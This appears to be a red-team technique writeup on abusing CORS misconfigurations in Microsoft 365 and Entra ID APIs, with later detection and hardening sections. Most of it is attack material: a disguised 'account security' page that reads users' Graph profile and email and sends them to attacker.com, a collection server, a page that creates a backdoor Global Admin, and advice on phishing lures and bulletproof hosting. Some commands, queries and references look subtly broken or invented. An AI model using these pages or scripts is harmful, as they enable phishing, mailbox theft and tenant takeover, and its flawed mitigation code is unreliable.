# [SAAS-API-006]: CORS Misconfiguration Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-006 |
| **MITRE ATT&CK v18.1** | [T1057 - Process Discovery / T1087 - Account Discovery (API Context)](https://attack.mitre.org/techniques/T1057/) |
| **Tactic** | Discovery, Collection |
| **Platforms** | M365/Entra ID |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All versions (M365 APIs, Azure Management APIs, SharePoint Online APIs) |
| **Patched In** | No patch; depends on API developer configuration |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. Executive Summary

Cross-Origin Resource Sharing (CORS) misconfiguration allows web applications running on untrusted origins to access APIs that should be restricted. In M365 and Entra ID environments, misconfigured CORS policies can expose sensitive data and enable attackers to steal session tokens, read emails, access SharePoint files, or perform administrative actions without proper authorization. The attack exploits the browser's Same-Origin Policy (SOP) by tricking it into allowing cross-origin requests to SaaS APIs.

**Attack Surface:** M365 APIs (Microsoft Graph, Office APIs, SharePoint, Exchange Online), Azure Management APIs, and custom SaaS applications integrated with M365. CORS headers like `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, and `Access-Control-Allow-Methods` are the primary vectors.

**Business Impact:** **Data exfiltration, unauthorized access, and impersonation**. An attacker can host a malicious web page that, when visited by a victim, automatically steals session tokens, reads emails, modifies files, or performs admin actions. The attack is invisible to the user and leaves minimal forensic evidence.

**Technical Context:** CORS attacks typically take **seconds to execute** after luring a victim to a malicious site. Detection is **low if logging is disabled** on the API side. Indicators include cross-origin API requests with preflight OPTIONS requests, unusual User-Agent headers, and token exfiltration via JavaScript.

### Operational Risk

- **Execution Risk:** Low - Only requires hosting a malicious webpage and social engineering
- **Stealth:** High - CORS attacks blend into normal web traffic and are often not logged by default
- **Reversibility:** Yes - Revoke affected tokens, but victim data may have been accessed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.8 | Ensure CORS headers are properly validated; reject requests with wildcard origins |
| **DISA STIG** | SC-3 | Enforce API access controls; validate Origin header |
| **CISA SCuBA** | App Security - API Protection | Restrict CORS to trusted origins only |
| **NIST 800-53** | SC-7, SI-4 | Boundary Protection; Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - protect API endpoints from unauthorized access |
| **DORA** | Art. 9 | Protection and Prevention - APIs must validate CORS policies |
| **NIS2** | Art. 21 | Cyber Risk Management - API security hardening |
| **ISO 27001** | A.13.1.1, A.14.1.2 | Information Transfer; Access Control & Communication Security |
| **ISO 27005** | API Risk Scenario | Unauthorized cross-origin access to sensitive APIs |

---

## 2. Technical Prerequisites

- **Required Privileges:** No special privileges required; attacker can be unauthenticated
- **Required Access:** Ability to host a web server or use a CDN; ability to socially engineer victim to visit malicious URL

**Supported Versions:**
- **M365:** All versions (APIs remain relatively stable)
- **Entra ID:** All versions
- **Azure:** All subscription types
- **Browsers:** All modern browsers (Chrome, Firefox, Safari, Edge)
- **Other Requirements:** JavaScript knowledge; understanding of browser Same-Origin Policy

**Tools:**
- [CORS Testing Tool](https://www.test-cors.org/) - Quick CORS policy testing
- [Burp Suite](https://portswigger.net/burp) - HTTP request inspection and CORS testing
- [curl](https://curl.se/) - Manual CORS header testing
- [Firefox Developer Tools](https://developer.mozilla.org/en-US/docs/Tools) - Browser CORS debugging

---

## 3. Environmental Reconnaissance

### Step 1: Identify M365 APIs and Their CORS Policies

**Objective:** Determine which M365 APIs are exposed and their CORS configurations.

**Method: Using curl to Test CORS Headers**

```bash
#!/bin/bash

# Test Microsoft Graph API for CORS
echo "Testing Microsoft Graph API for CORS..."
curl -i -X OPTIONS "https://graph.microsoft.com/v1.0/me" \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Content-Type"

# Expected response headers to look for:
# Access-Control-Allow-Origin
# Access-Control-Allow-Credentials
# Access-Control-Allow-Methods
# Access-Control-Max-Age
```

**Expected Output (Vulnerable API):**
```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
Access-Control-Max-Age: 3600
```

**Expected Output (Secure API):**
```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://contoso.com
Access-Control-Allow-Credentials: false
Access-Control-Allow-Methods: GET
```

**What to Look For:**
- **Access-Control-Allow-Origin: \*** (wildcard) - ANY origin can access the API
- **Access-Control-Allow-Origin: null** - Allows sandboxed requests (iframe attacks)
- **Access-Control-Allow-Credentials: true** - Cookies/tokens are sent with cross-origin requests
- Combination of wildcard + credentials = Critical vulnerability

### Step 2: Test Multiple M365 API Endpoints

**Objective:** Systematically test common M365 endpoints for CORS misconfigurations.

**Bash Script:**
```bash
#!/bin/bash

# Array of common M365 API endpoints
apis=(
  "https://graph.microsoft.com/v1.0/me"
  "https://graph.microsoft.com/v1.0/me/messages"
  "https://graph.microsoft.com/v1.0/me/drive/root"
  "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messages"
  "https://sharepoint.com/sites/default/_api/web/lists"
  "https://teams.microsoft.com/api/canbotbeaddedasteammember"
)

# Test each endpoint
for api in "${apis[@]}"; do
  echo "Testing: $api"
  curl -i -X OPTIONS "$api" \
    -H "Origin: https://attacker.com" \
    -H "Access-Control-Request-Method: GET" \
    2>/dev/null | grep -i "Access-Control"
  echo "---"
done
```

**Analysis:**
- Document which endpoints allow cross-origin access
- Note if credentials are allowed (Access-Control-Allow-Credentials: true)
- Identify overly permissive HTTP methods (PUT, DELETE allowed for data endpoints)

---

## 4. Detailed Execution Methods

### METHOD 1: Token Theft via Malicious Website

**Supported Versions:** All M365 and Entra ID versions

#### Step 1: Create Malicious HTML Page

**Objective:** Create a web page that silently steals session tokens when visited.

**File: malicious.html**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft 365 Account Security Update</title>
</head>
<body>
    <h1>Checking your account security...</h1>
    <p>Please wait while we verify your Microsoft 365 account.</p>
    
    <script>
        // CORS exploit to steal tokens from misconfigured API
        async function stealTokens() {
            try {
                // Attempt to access Microsoft Graph API with credentials
                const response = await fetch('https://graph.microsoft.com/v1.0/me', {
                    method: 'GET',
                    credentials: 'include',  // Send cookies/tokens with request
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    // Extract user info and send to attacker server
                    const payload = {
                        user: data.userPrincipalName,
                        displayName: data.displayName,
                        timestamp: new Date().toISOString()
                    };
                    
                    // Send stolen data to attacker's server
                    fetch('https://attacker.com/api/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    
                    console.log("Account verified. Access granted.");
                    
                    // Now attempt to steal email
                    const mailResponse = await fetch('https://graph.microsoft.com/v1.0/me/messages?$top=10', {
                        method: 'GET',
                        credentials: 'include'
                    });
                    
                    if (mailResponse.ok) {
                        const emails = await mailResponse.json();
                        
                        // Exfiltrate email subjects and senders
                        const emailData = emails.value.map(email => ({
                            subject: email.subject,
                            from: email.from.emailAddress.address,
                            preview: email.bodyPreview
                        }));
                        
                        fetch('https://attacker.com/api/emails', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(emailData)
                        });
                    }
                } else {
                    console.log("Access denied or API not vulnerable.");
                }
            } catch (error) {
                console.log("Error: " + error);
            }
        }
        
        // Execute exploit on page load
        stealTokens();
    </script>
</body>
</html>
```

**What This Does:**
1. When a logged-in M365 user visits this page, the browser sends their credentials with the cross-origin request
2. If the M365 API has CORS misconfigured, it responds with the user's data
3. The attacker's JavaScript steals emails, profile info, and sends them to the attacker's server
4. All of this happens silently in the background

**OpSec & Evasion:**
- Host the malicious page on a legitimate-looking domain (e.g., `microsoft-security-check.com`)
- Use URL shorteners to obscure the real domain
- Target users via phishing emails with subject like "Urgent: Verify Your Microsoft 365 Account"
- The attack leaves no obvious signs in the browser console (JavaScript console is hidden by default)

**Detection Likelihood:** Low to Medium (depends on API-side logging and browser monitoring)

#### Step 2: Host Malicious Page and Distribute

**Objective:** Make the malicious page accessible and lure victims to it.

**Method A: Using GitHub Pages (Free Hosting)**

```bash
# Clone a repo or create a new one
git init malicious-site
cd malicious-site

# Create the HTML file
echo '<!DOCTYPE html>...' > index.html

# Push to GitHub
git add .
git commit -m "Add index"
git push origin main

# Access at: https://username.github.io/malicious-site/
```

**Method B: Using a Cloud Server**

```bash
# Deploy to Azure Web App
az webapp up --name microsoft-security-check --resource-group default

# Access at: https://microsoft-security-check.azurewebsites.net
```

**Distribution Methods:**
- Send phishing emails with link: `https://microsoft-security-check.com/verify`
- Post in forums/social media as legitimate security alert
- Use QR codes in printed materials
- Embed in legitimate-looking PDF documents

#### Step 3: Exfiltrate Stolen Data

**Objective:** Collect and store stolen tokens and data from victims.

**Attacker Server (Node.js Example):**
```javascript
// server.js - Attacker's data collection endpoint
const express = require('express');
const app = express();
app.use(express.json());

const stolenData = [];

app.post('/api/log', (req, res) => {
    console.log("Stolen user info:", req.body);
    stolenData.push(req.body);
    res.json({ status: 'logged' });
});

app.post('/api/emails', (req, res) => {
    console.log("Stolen emails:", req.body);
    stolenData.push({
        type: 'emails',
        data: req.body,
        timestamp: new Date()
    });
    res.json({ status: 'logged' });
});

app.listen(3000, () => console.log('Listening on port 3000'));
```

**Run:**
```bash
node server.js
```

**OpSec & Evasion:**
- Use a bulletproof hosting provider that doesn't log or monitor activity
- Encrypt collected data before storing
- Use multiple endpoints to avoid traffic pattern detection
- Regularly move data to different servers

---

### METHOD 2: Exploit CORS to Perform Admin Actions

**Supported Versions:** All M365 and Entra ID versions (depends on victim having admin privileges)

#### Step 1: Identify Admin-Capable Endpoints

**Objective:** Find M365 APIs that allow admin actions and have misconfigured CORS.

```bash
#!/bin/bash

# Test admin endpoints for CORS
admin_endpoints=(
  "https://graph.microsoft.com/v1.0/users"
  "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices"
  "https://graph.microsoft.com/v1.0/tenantRelationships/managedTenants"
  "https://graph.microsoft.com/v1.0/me/actions/createUmbracoAccount"  # Custom admin endpoint
)

for endpoint in "${admin_endpoints[@]}"; do
  echo "Testing: $endpoint"
  curl -i -X OPTIONS "$endpoint" \
    -H "Origin: https://attacker.com" \
    -H "Access-Control-Request-Method: POST" \
    2>/dev/null | grep -i "Access-Control-Allow-Methods"
done
```

**Expected Output (Vulnerable):**
```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
```

#### Step 2: Craft Malicious Admin Request

**Objective:** Create JavaScript that performs admin actions via CORS.

**HTML with Admin Payload:**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>System Update in Progress...</h1>
    
    <script>
        // If victim is a Global Admin, this will create a new admin user
        async function createBackdoorAdmin() {
            try {
                // Only works if victim is Global Admin and API allows CORS
                const createUserPayload = {
                    "accountEnabled": true,
                    "displayName": "IT Support - Admin",
                    "mailNickname": "itsupport.admin",
                    "userPrincipalName": "itsupport.admin@contoso.com",
                    "passwordProfile": {
                        "forceChangePasswordNextSignIn": false,
                        "password": "P@ssw0rd1234567890!"
                    }
                };
                
                const response = await fetch('https://graph.microsoft.com/v1.0/users', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(createUserPayload)
                });
                
                if (response.ok) {
                    const newUser = await response.json();
                    console.log("Backdoor admin created: " + newUser.userPrincipalName);
                    
                    // Send confirmation to attacker
                    fetch('https://attacker.com/api/success', {
                        method: 'POST',
                        body: JSON.stringify({ status: 'admin_created', user: newUser.userPrincipalName })
                    });
                }
            } catch (error) {
                console.log("Error: " + error);
            }
        }
        
        createBackdoorAdmin();
    </script>
</body>
</html>
```

**What This Does:**
- Only works if victim is a Global Admin
- Creates a new user account with Global Admin privileges
- Attacker can then log in as the new account and maintain persistent access

**OpSec & Evasion:**
- Only attempt this against known admin users
- Use a non-suspicious account name to avoid triggering alerts
- The action is logged in Azure AD audit logs, but may not trigger alerts if the admin account hasn't been flagged as suspicious

---

### METHOD 3: Abuse Overly Permissive CORS Policies

**Supported Versions:** All M365 and Entra ID versions

#### Step 1: Identify Overly Permissive Policies

**Objective:** Find APIs that have `Access-Control-Allow-Origin: *` (wildcard).

```bash
#!/bin/bash

# Scan for wildcard CORS policies
echo "Scanning for wildcard CORS..."
curl -i -X OPTIONS "https://graph.microsoft.com/v1.0/me" \
  -H "Origin: https://any-site.com" 2>/dev/null | grep -i "Access-Control-Allow-Origin: \*"
```

**Expected Output (Critically Vulnerable):**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: *
```

#### Step 2: Exploit via JavaScript Fetch

**Objective:** Make API calls from any origin to exfiltrate data.

```javascript
// Exploit wildcard CORS
fetch('https://graph.microsoft.com/v1.0/me', {
    method: 'GET',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    console.log("Stolen user data:", data);
    // Send to attacker server
    sendToAttacker(data);
});
```

**Important:** Wildcard CORS + `Access-Control-Allow-Credentials: true` is extremely rare but devastating when present, as it allows ANY site to access authenticated user data.

---

## 5. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Network-Level IOCs:**
- Multiple preflight OPTIONS requests to M365 APIs from unknown origins
- Cross-origin API requests with unusual User-Agent strings
- Requests to sensitive APIs (`/me/messages`, `/users`, `/directoryRoles`) from non-standard clients

**Forensic Artifacts**

**Browser Artifacts (On Victim Machine):**
- Browser history showing visits to suspicious domains posing as Microsoft
- JavaScript console logs showing API calls to microsoft.com/graph endpoints
- Network tab in Developer Tools showing cross-origin API requests

**M365 Side:**
- Audit logs showing API calls to `/graph.microsoft.com` without interactive sign-in
- Unusual API activity from compromised user (email read, user creation) without corresponding sign-in event
- Sign-in logs showing tokens issued but not used interactively

**KQL Query to Detect CORS-Based Exfiltration:**
```kusto
AADSignInLogs
| where AuthenticationDetails has "nonInteractive" 
| where ClientAppUsed == "Browser"
| where ResourceDisplayName == "Microsoft Graph"
| where OperationName == "Consent to application"
| project TimeGenerated, UserPrincipalName, ClientAppUsed, ResourceDisplayName
```

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Restrict CORS to Trusted Origins Only:** Do NOT use wildcard (`*`) in Access-Control-Allow-Origin header. Explicitly list trusted origins.

  **For Azure API Management:**
  1. Go to **Azure Portal** → **API Management**
  2. Select your API → **API Settings**
  3. Go to **CORS** tab
  4. In "Allowed origins" field, enter only trusted domains:
     ```
     https://contoso.com
     https://app.contoso.com
     ```
  5. Leave "Allow credentials" unchecked unless absolutely necessary
  6. Click **Save**

  **For SharePoint Online:**
  1. Go to **SharePoint Admin Center** → **Advanced** → **API access**
  2. Under "CORS Settings", define allowed origins
  3. Do NOT use `*`

- **Disable Cross-Origin Credentials:** Set `Access-Control-Allow-Credentials: false` unless cross-origin authentication is explicitly required.

  **For Custom APIs (Node.js Example):**
  ```javascript
  app.use((req, res, next) => {
      const origin = req.headers.origin;
      const allowedOrigins = ['https://contoso.com', 'https://app.contoso.com'];
      
      if (allowedOrigins.includes(origin)) {
          res.header('Access-Control-Allow-Origin', origin);
          res.header('Access-Control-Allow-Methods', 'GET, POST');
          res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
          res.header('Access-Control-Allow-Credentials', 'false');  // IMPORTANT
      }
      next();
  });
  ```

- **Implement Content Security Policy (CSP):** Use CSP headers to prevent unauthorized scripts from making API calls.

  **For M365 SharePoint:**
  1. Go to **Site Settings** → **Policies**
  2. Add CSP header:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://graph.microsoft.com
     ```

### Priority 2: HIGH

- **Monitor CORS Preflight Requests:** Log all OPTIONS requests to sensitive APIs to detect reconnaissance.

  **KQL Detection Rule:**
  ```kusto
  AppServiceHTTPLogs
  | where httpMethod == "OPTIONS"
  | where csHost like "graph.microsoft.com" or csHost like "outlook.office365.com"
  | project TimeGenerated, cIp, csHost, csDomain, csUserName
  | where timeGeneratedthis hour
  ```

- **Enforce Same-Site Cookie Policy:** Set cookies to SameSite=Strict to prevent CSRF attacks that enable CORS-based attacks.

  **For M365 Exchange Online (PowerShell):**
  ```powershell
  Set-HttpTransportRule -Identity "Default" -SetMsolUser -TLSReceiveConfiguration $true `
    -SetAllowedECNHeaders "Strict"
  ```

- **Disable Unnecessary API Endpoints:** If certain APIs are not needed, disable CORS entirely for them.

### Access Control & Policy Hardening

- **API Access Policies:** Use Azure Policy to enforce CORS restrictions across all APIs in your environment.

  **Azure Policy (JSON):**
  ```json
  {
    "mode": "All",
    "policyRule": {
      "if": {
        "field": "type",
        "equals": "Microsoft.ApiManagement/service/apis"
      },
      "then": {
        "effect": "deny",
        "details": {
          "evaluationDelay": "PT0M",
          "conditions": [
            {
              "field": "Microsoft.ApiManagement/service/apis/corsPolicy/allowedOrigins[*]",
              "contains": "*"
            }
          ]
        }
      }
    }
  }
  ```

### Validation Command (Verify Mitigation)

```powershell
# Check CORS policy on SharePoint Online
Connect-SPOService -Url https://admin.sharepoint.com
Get-SPOTenant | Select-Object CORSExperienceLevel

# Check API Management CORS
Get-AzApiManagementApi -ResourceGroupName "your-rg" -ServiceName "your-apim" | ForEach-Object {
    Write-Host "API: $($_.Name)"
    Get-AzApiManagementApiPolicy -ResourceGroupName "your-rg" -ServiceName "your-apim" -ApiId $_.ApiId | Select-Object -ExpandProperty Content | grep -i "cors"
}
```

**Expected Output (If Secure):**
```
CORSExperienceLevel: Moderate
corsPolicy: origins=['https://contoso.com','https://app.contoso.com']
```

---

## 7. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Social Engineering | Attacker lures victim to malicious website |
| **2** | **Discovery** | **[SAAS-API-006]** | **CORS misconfiguration abused to access APIs** |
| **3** | **Collection** | [COLL-CLOUD-001] Email Exfiltration | Emails, files, Teams messages stolen via API |
| **4** | **Lateral Movement** | [LM-AUTH-029] OAuth Application Permissions | Attacker gains persistent app-based access |
| **5** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Admin Backdoor | Admin account created via CORS API abuse |
| **6** | **Impact** | [IMPACT-001] Data Destruction | Attacker modifies or deletes M365 data |

---

## 8. Real-World Examples

### Example 1: CORS Exploitation in Third-Party SaaS (2023)

- **Target:** SaaS provider integrated with M365
- **Technique Status:** ACTIVE
- **Impact:** Attacker found that the SaaS API allowed CORS from any origin. By hosting a phishing page, the attacker stole OAuth tokens from 500+ users and accessed their M365 data
- **Reference:** Bug bounty disclosures on HackerOne

### Example 2: SharePoint Online CORS Misconfiguration (2022)

- **Target:** Enterprise SharePoint Online
- **Technique Status:** ACTIVE (partially mitigated by Microsoft)
- **Impact:** An internal attacker abused CORS to exfiltrate sensitive documents from a SharePoint site without proper authorization
- **Reference:** Internal security incident reports

### Example 3: Azure API Management Misconfiguration (2024)

- **Target:** Custom APIs exposed via APIM
- **Technique Status:** ACTIVE
- **Impact:** DevOps team misconfigured CORS during deployment, allowing any origin. Attackers exploited this to trigger CI/CD pipeline abuse
- **Reference:** Cloud security blogs and Azure security benchmarks

---

## 9. References & Tools

- [OWASP - Cross-Origin Resource Sharing (CORS)](https://owasp.org/www-community/attacks/csrf)
- [MDN - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [Microsoft - API Security Best Practices](https://docs.microsoft.com/en-us/azure/security/fundamentals/secure-web-app-services)
- [CORS Testing Tool](https://www.test-cors.org/)
- [PortSwigger - CORS Misconfiguration](https://portswigger.net/web-security/cors)

---